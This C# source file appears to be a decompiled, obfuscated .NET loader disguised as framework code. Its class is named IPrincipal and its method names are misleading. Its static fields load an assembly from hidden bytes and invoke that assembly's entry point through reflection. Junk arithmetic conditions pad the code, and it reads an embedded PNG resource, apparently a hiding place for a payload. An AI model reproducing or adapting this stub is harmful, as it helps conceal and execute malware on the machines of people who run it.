using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;

public class IPrincipal
{
	public static ImageFormat arizona = ImageFormat.get_Png();

	public static Assembly open = Assembly.Load(IsVolatile.SchemaTableOptionalColumn());

	public static MethodInfo mentry = Assembly.Load(IsVolatile.SchemaTableOptionalColumn()).EntryPoint;

	public static object PropertyGridServiceProvider(Assembly assembly, MethodInfo entryPoint)
	{
		return assembly.CreateInstance(SqlGuidStorage(entryPoint));
	}

	public static void TakeOrSkipWhileQueryOperatorEnumerator1(Assembly assembly, MethodInfo entryPoint)
	{
		entryPoint.Invoke(PropertyGridServiceProvider(assembly, entryPoint), null);
	}

	public static string SqlGuidStorage(MethodInfo entryPoint)
	{
		return (string)UrlDecoder(entryPoint);
	}

	public static void XSOEnumerator()
	{
		RichTextBoxConstants();
	}

	internal static object UrlDecoder(object asm)
	{
		return ((MemberInfo)asm).Name;
	}

	internal static bool RichTextBoxConstants()
	{
		TakeOrSkipWhileQueryOperatorEnumerator1(open, mentry);
		int num = Convert.ToInt32(-2125402666.0);
		if ((Convert.ToInt32(951251571.4500141 - Math.Cos(475625785.5)) ^ Convert.ToInt32(2075351801.9839382 + Math.Log10(1037675905.5))) == Convert.ToInt32(1124182384.0))
		{
			Convert.ToInt32(2.0);
			num += Convert.ToInt32(2125402667.0);
		}
		return (byte)num != 0;
	}

	internal static bool AccessibleObject()
	{
		int num = -20498248;
		if ((Convert.ToInt32(247343246.0 + Math.Tanh(123671623.5)) ^ Convert.ToInt32(953088601.0 + Math.Floor(953088601.0))) == Convert.ToInt32(2133056598.6743453 - Math.Tan(1066528286.5)))
		{
			Convert.ToInt32(2.0 + Math.Log10(1.0));
			num += Convert.ToInt32(20498248.0);
		}
		return (byte)num != 0;
	}

	public static Image getResourceImg(Assembly asm)
	{
		using (Stream stream = asm.GetManifestResourceStream("LocalDataStoreElement.png"))
		{
			if (stream != null)
			{
				return Image.FromStream(stream);
			}
		}
		return null;
	}
}
